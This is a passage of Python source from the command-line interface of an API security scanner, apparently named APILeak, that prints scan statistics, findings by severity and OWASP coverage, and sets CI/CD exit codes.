        # Get enhanced statistics from findings collector
        if hasattr(results, 'findings_collector') and results.findings_collector:
            stats = results.findings_collector.get_statistics()
            owasp_coverage = results.findings_collector.get_owasp_coverage()
            
            # Show advanced discovery results if available
            if hasattr(results, 'advanced_results'):
                advanced_results = results.advanced_results
                if hasattr(advanced_results, 'framework_detected') and advanced_results.framework_detected:
                    click.echo(f"🔍 Framework Detected: {advanced_results.framework_detected.name} (confidence: {advanced_results.framework_detected.confidence:.2f})")
                if hasattr(advanced_results, 'api_versions_found') and advanced_results.api_versions_found:
                    click.echo(f"📋 API Versions Found: {len(advanced_results.api_versions_found)}")
                if hasattr(advanced_results, 'subdomains_discovered') and advanced_results.subdomains_discovered:
                    click.echo(f"🌐 Subdomains Discovered: {len(advanced_results.subdomains_discovered)}")
                if hasattr(advanced_results, 'waf_detected') and advanced_results.waf_detected:
                    click.echo(f"🛡️  WAF Detected: {advanced_results.waf_detected.name} (confidence: {advanced_results.waf_detected.confidence:.2f})")
            
            # Show scan-specific metrics
            if scan_type == "dir":
                endpoints_tested = getattr(results.statistics, 'endpoints_tested', 0)
                click.echo(f"Total Endpoints Tested: {endpoints_tested}")
                if hasattr(results, 'discovered_endpoints'):
                    valid_endpoints = [e for e in core.get_discovered_endpoints() if hasattr(e, 'status_code') and e.status_code in [200, 201, 202, 204]]
                    if valid_endpoints:
                        click.echo("📍 Endpoints Found:")
                        for endpoint in valid_endpoints[:10]:  # Show first 10
                            click.echo(f"  - {endpoint.method} {endpoint.url} ({endpoint.status_code})")
                        if len(valid_endpoints) > 10:
                            click.echo(f"  ... and {len(valid_endpoints) - 10} more")
                    else:
                        click.echo("No valid endpoints found (all returned 404 or errors)")
            elif scan_type == "param":
                click.echo(f"Total Parameters Tested: {getattr(results.statistics, 'parameters_tested', 0)}")
            
            click.echo(f"Total Findings: {stats['total_findings']}")
            click.echo(f"Critical: {stats['critical_findings']}")
            click.echo(f"High: {stats['high_findings']}")
            click.echo(f"Medium: {stats['medium_findings']}")
            click.echo(f"Low: {stats['low_findings']}")
            click.echo(f"Info: {stats['info_findings']}")
            click.echo(f"OWASP Coverage: {owasp_coverage['coverage_percentage']:.1f}% ({owasp_coverage['tested_categories']}/{owasp_coverage['total_categories']} categories)")
            
            # Show most critical category if any
            if stats.get('most_critical_category'):
                click.echo(f"Most Critical Category: {stats['most_critical_category']}")
        else:
            # Fallback to basic statistics
            click.echo(f"Total Findings: {results.statistics.findings_count}")
            click.echo(f"Critical: {results.statistics.critical_findings}")
            click.echo(f"High: {results.statistics.high_findings}")
            click.echo(f"Medium: {results.statistics.medium_findings}")
            click.echo(f"Low: {results.statistics.low_findings}")
            click.echo(f"Info: {results.statistics.info_findings}")
        
        click.echo(f"\nReports generated:")
        for report_file in report_files:
            click.echo(f"  - {report_file}")
        
        # Enhanced CI/CD integration with configurable exit codes
        if ci_mode:
            critical_count = getattr(results.statistics, 'critical_findings', 0)
            high_count = getattr(results.statistics, 'high_findings', 0)
            medium_count = getattr(results.statistics, 'medium_findings', 0)
            low_count = getattr(results.statistics, 'low_findings', 0)
            
            # Determine exit code based on fail_on setting
            exit_code = 0
            exit_reason = "No significant findings"
            
            if fail_on == "critical" and critical_count > 0:
                exit_code = 2
                exit_reason = f"{critical_count} critical findings"
            elif fail_on == "high" and (critical_count > 0 or high_count > 0):
                exit_code = 2 if critical_count > 0 else 1
                exit_reason = f"{critical_count} critical, {high_count} high findings"
            elif fail_on == "medium" and (critical_count > 0 or high_count > 0 or medium_count > 0):
                exit_code = 2 if critical_count > 0 else (1 if high_count > 0 else 1)
                exit_reason = f"{critical_count} critical, {high_count} high, {medium_count} medium findings"
            elif fail_on == "low" and (critical_count > 0 or high_count > 0 or medium_count > 0 or low_count > 0):
                exit_code = 2 if critical_count > 0 else (1 if high_count > 0 else 1)
                exit_reason = f"{critical_count} critical, {high_count} high, {medium_count} medium, {low_count} low findings"
            
            click.echo(f"\n🔄 CI/CD Result: Exit code {exit_code} - {exit_reason}")
            
            logger.info("CI/CD scan completed", exit_code=exit_code, reason=exit_reason)
            sys.exit(exit_code)
        else:
            # Standard exit codes for non-CI mode
            critical_count = getattr(results.statistics, 'critical_findings', 0)
            high_count = getattr(results.statistics, 'high_findings', 0)
            
            if critical_count > 0:
                logger.info("Exiting with code 2 due to critical findings")
                sys.exit(2)
            elif high_count > 0:
                logger.info("Exiting with code 1 due to high severity findings")
                sys.exit(1)
            else:
                logger.info("Scan completed successfully with no critical/high findings")
                sys.exit(0)
            
    except Exception as e:
        logger.error("Enhanced scan execution failed", error=str(e))
        if ci_mode:
            click.echo(f"\n❌ CI/CD Scan Failed: {e}")
            sys.exit(3)  # Special exit code for scan failures in CI
        raise


async def run_apileak(config):
    """
    Run APILeak scan with the provided configuration (legacy compatibility)
    
    Args:
        config: APILeak configuration
    """
    # Delegate to enhanced version with default CI settings
    await run_enhanced_apileak(config, ci_mode=False, fail_on="critical")


if __name__ == '__main__':
    cli()